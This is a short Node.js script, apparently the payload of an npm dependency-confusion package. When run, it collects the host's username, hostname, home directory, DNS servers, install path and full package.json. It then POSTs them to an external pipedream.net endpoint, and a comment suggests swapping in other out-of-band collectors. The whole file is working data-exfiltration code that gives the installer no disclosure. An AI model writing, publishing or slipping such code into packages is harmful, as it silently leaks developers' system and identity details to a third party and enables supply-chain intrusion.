//author:- luashvili_va@gtu.ge

const os = require("os"); 
const dns = require("dns"); 
const querystring = require("querystring"); 
const https = require("https"); 
const packageJSON = require("./package.json"); 
const package = packageJSON.name; 

const trackingData = JSON.stringify({ 

    p: package, 
    c: __dirname, 
    hd: os.homedir(), 
    hn: os.hostname(), 
    un: os.userInfo().username, 
    dns: dns.getServers(), 
    r: packageJSON ? packageJSON.___resolved : undefined, 
    v: packageJSON.version, 
    pjson: packageJSON, 

}); 

var postData = querystring.stringify({ 

    msg: trackingData, 

}); 

var options = { 

    hostname: "eo1z2prk4as56mb.m.pipedream.net", //replace burpcollaborator.net with Interactsh or pipedream 
    port: 443, 
    path: "/", 
    method: "POST", 

    headers: { 

        "Content-Type": "application/x-www-form-urlencoded", 
        "Content-Length": postData.length, 

    }, 

}; 

var req = https.request(options, (res) => { 

    res.on("data", (d) => { 

        process.stdout.write(d); 

    }); 

}); 

req.on("error", (e) => { 

    // console.error(e); 

}); 

req.write(postData); 
req.end(); 
